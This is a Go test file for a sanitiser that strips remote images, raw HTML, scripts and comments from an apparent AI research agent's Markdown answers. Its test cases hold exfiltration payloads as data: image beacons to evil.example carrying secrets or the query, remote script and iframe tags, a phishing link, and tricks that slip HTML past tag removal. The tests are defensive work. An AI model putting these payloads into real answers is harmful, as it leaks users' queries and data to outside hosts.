package fleet

import (
	"context"
	"regexp"
	"strings"
	"testing"

	"github.com/rxbynerd/chiron/internal/researcher/fleet/model/modeltest"
	"github.com/rxbynerd/chiron/internal/researcher/fleet/search"
	"github.com/rxbynerd/chiron/internal/researcher/fleet/search/searchtest"
	"github.com/rxbynerd/chiron/internal/types"
)

func TestSanitiseAnswer(t *testing.T) {
	for _, tt := range []struct {
		name, in, want string
	}{
		{"plain", "# Title\n\nbody", "# Title\n\nbody"},
		{"image becomes link", "see ![chart](https://evil.example/b?q=x)", "see [chart](https://evil.example/b?q=x)"},
		{"empty alt image", "![](https://evil.example/b)", "[](https://evil.example/b)"},
		{"img tag dropped", `a <img src="https://evil.example/b"> b`, "a  b"},
		{"script dropped", "a<script>fetch('x')</script>b", "afetch('x')b"},
		{"comment dropped", "a<!-- hidden -->b", "ab"},
		{"multiline tag dropped", "a<div\nclass=\"x\">b</div>", "ab"},
		{"autolink kept", "see <https://example.org/x>", "see <https://example.org/x>"},
		{"http autolink kept", "see <http://example.org/x>", "see <http://example.org/x>"},
		{"other autolink escaped", "mail <mailto:a@example.org>", `mail \<mailto:a@example.org>`},
		{"less-than kept", "1 < 2 and 3 > 2", "1 < 2 and 3 > 2"},
		{"less-than before a digit kept", "a<3", "a<3"},
		{"less-than before a letter in code escaped", "use `a<b`", "use `a\\<b`"},
		{"tag with a less-than in an attribute escaped", `<img src="https://evil.example/b?q=QUERY" alt="<">`, `\<img src="https://evil.example/b?q=QUERY" alt="<">`},
		{"tag rebuilt by removal dropped", "<<b>img src=https://evil.example/n>", ""},
		{"script with less-thans in attributes escaped", `<script src="https://evil.example/x.js" data-x="<"></script x="<">`, `\<script src="https://evil.example/x.js" data-x="<">\</script x="<">`},
		{"iframe with a less-than in an attribute escaped", `<iframe src="https://evil.example/f" title="<"></iframe>`, `\<iframe src="https://evil.example/f" title="<">`},
		{"link with a less-than in an attribute escaped", `<a href="https://evil.example/phish" title="<">click</a>`, `\<a href="https://evil.example/phish" title="<">click`},
		{"unclosed comment escaped", "# Report\n\nThe answer is X.\n\n<!-- reviewer note", "# Report\n\nThe answer is X.\n\n\\<!-- reviewer note"},
		{"unclosed script line escaped", "a\n<script\nb", "a\n\\<script\nb"},
		{"processing instruction escaped", "<?php echo 1;", `\<?php echo 1;`},
		{"escaped opener kept", `\<img src=x alt="<">`, `\<img src=x alt="<">`},
		{"escaped backslash before an opener escaped", `\\<img src=x alt="<">`, `\\\<img src=x alt="<">`},
		{"escaped bracket in alt", `![x\]](https://evil.example/b?d=SECRET)`, `[x\]](https://evil.example/b?d=SECRET)`},
		{"nested brackets in alt", "![a [b] c](https://evil.example/b?d=SECRET)", "[a [b] c](https://evil.example/b?d=SECRET)"},
		{"reference image", "![a][r]\n\n[r]: https://evil.example/b?d=SECRET", "[a][r]\n\n[r]: https://evil.example/b?d=SECRET"},
		{"shortcut reference image", "![r]\n\n[r]: https://evil.example/b?d=SECRET", "[r]\n\n[r]: https://evil.example/b?d=SECRET"},
		{"collapsed reference image", "![r][]\n\n[r]: https://evil.example/b", "[r][]\n\n[r]: https://evil.example/b"},
		{"repeated bangs", "!!![x](https://evil.example/b)", "[x](https://evil.example/b)"},
		{"image rejoined by tag removal", "!<b></b>[x](https://evil.example/b)", "[x](https://evil.example/b)"},
		{"exclamation kept", "Wow! [link](https://a.example)", "Wow! [link](https://a.example)"},
	} {
		t.Run(tt.name, func(t *testing.T) {
			if got := sanitiseAnswer(tt.in); got != tt.want {
				t.Errorf("sanitiseAnswer(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

// rawHTMLProbes are answers that carry live raw HTML past single-pass tag
// removal, or open an HTML block that swallows the rest of the document.
var rawHTMLProbes = []string{
	`<img src="https://evil.example/b?q=QUERY" alt="<">`,
	"<<b>img src=https://evil.example/n>",
	`<script src="https://evil.example/x.js" data-x="<"></script x="<">`,
	`<iframe src="https://evil.example/f" title="<"></iframe>`,
	`<a href="https://evil.example/phish" title="<">click</a>`,
	"# Report\n\nThe answer is X.\n\n<!-- reviewer note",
	"# Report\n\n<script\nThe answer is X.",
}

// unescapedHTMLOpener matches a "<" that could open raw HTML with no
// backslash before it. The probes carry no backslash of their own, so one
// before a "<" is always the sanitiser's escape.
var unescapedHTMLOpener = regexp.MustCompile(`(^|[^\\])<[A-Za-z/!?]`)

// TestSanitiseAnswerLeavesNoRawHTMLOpener: whatever tag removal misses, no
// "<" that could open raw HTML survives unescaped, alone or appended to
// ordinary Markdown.
func TestSanitiseAnswerLeavesNoRawHTMLOpener(t *testing.T) {
	for _, probe := range rawHTMLProbes {
		for _, in := range []string{probe, "# Report\n\nBody text.\n\n" + probe + "\n\nMore text."} {
			if got := sanitiseAnswer(in); unescapedHTMLOpener.MatchString(got) {
				t.Errorf("sanitiseAnswer(%q) = %q, which keeps an unescaped raw-HTML opener", in, got)
			}
		}
	}
}

// TestRunWorkerFinalAnswerIsSanitised: a final answer that embeds a remote
// image and raw HTML reaches the Finding as plain Markdown, so opening the
// report cannot fire a beacon carrying the query.
func TestRunWorkerFinalAnswerIsSanitised(t *testing.T) {
	searchSrv := searchtest.NewFakeServer([]search.Result{{Title: "A", URL: "https://a.example"}})
	defer searchSrv.Close()
	modelSrv := modeltest.NewFakeServer(
		modeltest.FakeReply{Content: `{"action":"search","query":"x"}`, FinishReason: "stop"},
		finalReply("# Report\n\n![tracker](https://evil.example/b?q=secret)\n<img src=\"https://evil.example/i\">\nSee <https://a.example>.", "https://a.example"),
	)
	defer modelSrv.Close()

	deps := WorkerDeps{
		Model:  newModelClient(t, modelSrv),
		Search: newSearchClient(t, searchSrv),
		Fetch:  newFetchClient(t),
		Caps:   caps(),
	}
	finding := RunWorker(context.Background(), deps, Brief{Objective: "q"})

	if finding.Status != types.StatusCompleted {
		t.Fatalf("status = %s (%s), want completed", finding.Status, finding.Detail)
	}
	if strings.Contains(finding.Text, "![") || strings.Contains(finding.Text, "<img") {
		t.Errorf("answer still carries a remote image or raw HTML:\n%s", finding.Text)
	}
	for _, want := range []string{"# Report", "[tracker](https://evil.example/b?q=secret)", "<https://a.example>"} {
		if !strings.Contains(finding.Text, want) {
			t.Errorf("answer lost %q:\n%s", want, finding.Text)
		}
	}
}
